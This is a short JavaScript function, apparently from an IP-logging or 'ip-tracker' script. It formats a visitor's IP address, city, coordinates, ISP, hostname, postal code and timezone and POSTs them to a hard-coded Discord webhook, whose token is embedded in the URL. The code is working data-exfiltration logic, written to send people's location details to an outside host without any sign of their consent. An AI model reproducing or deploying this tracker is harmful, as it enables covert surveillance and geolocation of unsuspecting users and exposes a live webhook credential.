
function collectInfo(json) {
    var wbRequest = new XMLHttpRequest();
    wbRequest.open("POST", "https://discord.com/api/webhooks/1125245988093825144/QZUXFnlGiBBiYFXuaVH0MiWqxZqvvzgjRdBaUYrxYqu_xmBfYTdgfBguvzvI3ysedt6y");
    wbRequest.setRequestHeader('Content-type', 'application/json');
    var params = {
      username: "ip-tracker",
      avatar_url: "https://cdn.discordapp.com/attachments/1091553414435057704/1128372146868060341/TRViimi-sFBezGpQXG4_G2Ksw2WExJxQ2J2u3XYVIXRC3M3x57Q3MgAj-FYW_c4BRakw240-h480.png",
      content: "ip-tracker\n",
      embeds: [{
        title: "ip-tracker",
        color: "#0000000",
        description: `**IP:** \`${json.ip}\`\n` +
                     `**Region:** \`${json.country}, ${json.region}, ${json.city}\`\n` +
                     `**Coords.:** \`${json.loc}\`\n\n` +
                     `**Provider:** \`${json.org}\`\n` +
                     `**Host:** \`${json.hostname}\`\n\n` +
                     `**ZIP Code:** \`${json.postal}\`\n` +
                     `**Timezone:** \`${json.timezone}\``
      }]
    };
    wbRequest.send(JSON.stringify(params));
  }
